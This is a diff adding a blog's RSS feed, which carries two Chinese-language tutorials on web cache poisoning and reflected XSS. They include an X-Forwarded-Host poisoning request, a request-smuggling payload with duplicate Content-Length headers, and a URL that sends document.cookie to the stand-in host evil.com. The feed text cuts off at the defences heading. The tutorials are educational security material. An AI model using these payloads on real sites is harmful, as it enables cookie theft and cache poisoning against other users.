@@ -1,0 +1,674 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>网络安全 on 为霜的博客</title>
+    <link>https://blog.jiyi27.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link>
+    <description>Recent content in 网络安全 on 为霜的博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 13 Apr 2025 00:02:28 +0000</lastBuildDate><atom:link href="https://blog.jiyi27.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>缓存投毒</title>
+      <link>https://blog.jiyi27.com/posts/networking/011-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</link>
+      <pubDate>Sun, 13 Apr 2025 00:02:28 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/011-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</guid>
+      <description>&lt;h2 id=&#34;1-缓存投毒-web-cache-posioning&#34;&gt;1. 缓存投毒 Web Cache Posioning&lt;/h2&gt;
+&lt;h3 id=&#34;11-基础概念&#34;&gt;1.1. 基础概念&lt;/h3&gt;
+&lt;p&gt;Web 缓存投毒攻击的核心在于: 攻击者找到一种方法, 让&lt;strong&gt;缓存系统存储并向其他用户提供恶意内容&lt;/strong&gt;, 在 CDN 场景中, 这种攻击尤为危险:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;CDN 服务于大量用户&lt;/li&gt;
+&lt;li&gt;缓存内容可能持续较长时间&lt;/li&gt;
+&lt;li&gt;影响范围广泛且难以快速修复&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这里说的缓存就是上面我们讨论的 CDN, 简单来说, 当一个用户访问了例如 &lt;code&gt;/static/test.png&lt;/code&gt;, Cache 服务将会缓存, 之后再有用户访问相同的资源时, Cache服务将不会转发此请求至后端服务器, 而是直接将其保存的对应的数据返回, 那这里有个题外话, CDN 判断两个请求是否相同的依据是什么?  答案是 缓存建, 缓存键通常由以下部分组成：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;URL 路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;主机名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;某些特定的请求头（如 Accept-Encoding）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询参数（可配置是否包含）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;用户请求 → CDN 边缘节点 → 检查缓存键 → 缓存命中返回内容/缓存未命中从源站获取
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有一种简单的方式是基于 url 以及 host 头时, 那么缓存服务器将简单地认为下两个请求是等同的:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/04/ec33be3d6c3fc5ddd2905f29256ec613.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到, 橙色字体将是缓存服务器判断的根据, 所以缓存服务器将会把第一个请求的响应拿来作为第二个请求的响应,&lt;/p&gt;
+&lt;h3 id=&#34;12-简单例子&#34;&gt;1.2. 简单例子&lt;/h3&gt;
+&lt;p&gt;举个例子: &lt;strong&gt;利用未验证的 HTTP 头&lt;/strong&gt; 假设有一个电商网站 ⁠&lt;code&gt;shop.example.com&lt;/code&gt;, 使用 CDN 加速内容分发, 该网站有一个功能, 根据用户的地理位置显示不同的促销信息, 网站后端代码:&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-缓存投毒-web-cache-posioning&#34;&gt;1. 缓存投毒 Web Cache Posioning&lt;/h2&gt;
+&lt;h3 id=&#34;11-基础概念&#34;&gt;1.1. 基础概念&lt;/h3&gt;
+&lt;p&gt;Web 缓存投毒攻击的核心在于: 攻击者找到一种方法, 让&lt;strong&gt;缓存系统存储并向其他用户提供恶意内容&lt;/strong&gt;, 在 CDN 场景中, 这种攻击尤为危险:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;CDN 服务于大量用户&lt;/li&gt;
+&lt;li&gt;缓存内容可能持续较长时间&lt;/li&gt;
+&lt;li&gt;影响范围广泛且难以快速修复&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这里说的缓存就是上面我们讨论的 CDN, 简单来说, 当一个用户访问了例如 &lt;code&gt;/static/test.png&lt;/code&gt;, Cache 服务将会缓存, 之后再有用户访问相同的资源时, Cache服务将不会转发此请求至后端服务器, 而是直接将其保存的对应的数据返回, 那这里有个题外话, CDN 判断两个请求是否相同的依据是什么?  答案是 缓存建, 缓存键通常由以下部分组成：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;URL 路径&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;主机名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;某些特定的请求头（如 Accept-Encoding）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询参数（可配置是否包含）&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;用户请求 → CDN 边缘节点 → 检查缓存键 → 缓存命中返回内容/缓存未命中从源站获取
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有一种简单的方式是基于 url 以及 host 头时, 那么缓存服务器将简单地认为下两个请求是等同的:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/04/ec33be3d6c3fc5ddd2905f29256ec613.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到, 橙色字体将是缓存服务器判断的根据, 所以缓存服务器将会把第一个请求的响应拿来作为第二个请求的响应,&lt;/p&gt;
+&lt;h3 id=&#34;12-简单例子&#34;&gt;1.2. 简单例子&lt;/h3&gt;
+&lt;p&gt;举个例子: &lt;strong&gt;利用未验证的 HTTP 头&lt;/strong&gt; 假设有一个电商网站 ⁠&lt;code&gt;shop.example.com&lt;/code&gt;, 使用 CDN 加速内容分发, 该网站有一个功能, 根据用户的地理位置显示不同的促销信息, 网站后端代码:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; 服务器端代码
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/promotions&amp;#39;&lt;/span&gt;, (req, res) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; 从 X&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Forwarded&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Host 头获取主机名&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;用于构建资源 URL
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  const host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; req&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;headers[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x-forwarded-host&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;shop.example.com&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; 返回包含动态脚本引用的 HTML
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Today&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s Promotions&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;script src&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://$&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{host}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/scripts/promo.js&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Special Offers&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;h1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; 页面内容 &lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;攻击者发现 &lt;code&gt;⁠X-Forwarded-Host&lt;/code&gt; 头被直接用于构建脚本 URL, 但这个头不是缓存键的一部分, 于是发送以下请求:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /promotions HTTP/1.1
+Host: shop.example.com
+X-Forwarded-Host: malicious-site.com
+User-Agent: Mozilla/5.0 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;服务器生成包含 ⁠&lt;code&gt;&amp;lt;script src=&amp;quot;https://malicious-site.com/scripts/promo.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; 的响应&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;CDN 缓存这个响应，但缓存键中不包含 ⁠&lt;code&gt;X-Forwarded-Host&lt;/code&gt; 头&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;所有后续访问 ⁠&lt;code&gt;/promotions&lt;/code&gt; 的用户都会加载攻击者控制的 JavaScript&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;13-实际案例-akamai-cdn-缓存投毒2019&#34;&gt;1.3. 实际案例 Akamai CDN 缓存投毒（2019）&lt;/h3&gt;
+&lt;p&gt;研究人员发现 Akamai CDN 配置中的一个问题, 允许攻击者通过操纵 HTTP 请求, 将恶意内容注入缓存:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;POST &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;search HTTP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: vulnerable&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;site&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Type: application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;testGET &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;search&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;?&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;lt;&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;XSS&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; HTTP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;X&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Ignore: X
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;两个 Content-Length 头&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;第一个声明内容长度为 128 字节&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;第二个声明内容长度为 4 字节&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;CDN 的处理&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Akamai CDN 可能使用第二个 ⁠Content-Length: 4&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;因此 CDN 只将 ⁠&lt;code&gt;q=test&lt;/code&gt; 作为请求体，认为请求到此结束&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;源站服务器的处理&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;源站可能使用第一个 ⁠Content-Length: 128&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;将整个内容视为一个请求体&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;但在处理后，剩余的内容 ⁠&lt;code&gt;GET /search?q=&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt; HTTP/1.1...&lt;/code&gt; 被解释为第二个请求&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;缓存污染&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;源站对第二个&lt;strong&gt;走私请求&lt;/strong&gt;的响应（包含 XSS 脚本）可能被 CDN 缓存&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;CDN 使用 URL 路径 ⁠&lt;code&gt;/search?q=&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; 作为缓存键&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;后续用户访问 ⁠&lt;code&gt;/search&lt;/code&gt; 时可能会收到包含 XSS 的缓存响应&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;部分参考: &lt;a href=&#34;https://ph4ntonn.github.io/Web-Cache-Poisoning&#34;&gt;https://ph4ntonn.github.io/Web-Cache-Poisoning&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>XSS Attack</title>
+      <link>https://blog.jiyi27.com/posts/networking/009-xss-attack/</link>
+      <pubDate>Sat, 12 Apr 2025 23:58:57 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/009-xss-attack/</guid>
+      <description>&lt;h2 id=&#34;1-xss-攻击&#34;&gt;1. XSS 攻击&lt;/h2&gt;
+&lt;p&gt;XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的,&lt;/p&gt;
+&lt;h3 id=&#34;11-反射型-xss-reflected-xss&#34;&gt;1.1. 反射型 XSS (Reflected XSS)&lt;/h3&gt;
+&lt;p&gt;反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递）&lt;/li&gt;
+&lt;li&gt;用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程）&lt;/li&gt;
+&lt;li&gt;服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中&lt;/li&gt;
+&lt;li&gt;浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;假设有一个简单的搜索网站 &lt;code&gt;example.com&lt;/code&gt;, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 &lt;code&gt;http://example.com/search?q=apple&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;结果页面会显示:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;您搜索了：apple
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;alert(&amp;#39;Hacked!&amp;#39;);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击这个链接时，服务器会将 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;Hacked!&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt; 直接嵌入到响应页面中，生成如下 HTML:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  您搜索了：&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Hacked!&amp;#39;&lt;/span&gt;);&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!&lt;/p&gt;
+&lt;p&gt;攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;document.location=&amp;#39;http://evil.com/steal?cookie=&amp;#39;+document.cookie;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 &lt;code&gt;evil.com&lt;/code&gt;&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-xss-攻击&#34;&gt;1. XSS 攻击&lt;/h2&gt;
+&lt;p&gt;XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的,&lt;/p&gt;
+&lt;h3 id=&#34;11-反射型-xss-reflected-xss&#34;&gt;1.1. 反射型 XSS (Reflected XSS)&lt;/h3&gt;
+&lt;p&gt;反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行,&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递）&lt;/li&gt;
+&lt;li&gt;用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程）&lt;/li&gt;
+&lt;li&gt;服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中&lt;/li&gt;
+&lt;li&gt;浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;假设有一个简单的搜索网站 &lt;code&gt;example.com&lt;/code&gt;, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 &lt;code&gt;http://example.com/search?q=apple&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;结果页面会显示:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;您搜索了：apple
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;alert(&amp;#39;Hacked!&amp;#39;);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击这个链接时，服务器会将 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;Hacked!&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt; 直接嵌入到响应页面中，生成如下 HTML:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  您搜索了：&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Hacked!&amp;#39;&lt;/span&gt;);&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!&lt;/p&gt;
+&lt;p&gt;攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://example.com/search?q=&amp;lt;script&amp;gt;document.location=&amp;#39;http://evil.com/steal?cookie=&amp;#39;+document.cookie;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 &lt;code&gt;evil.com&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御措施&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
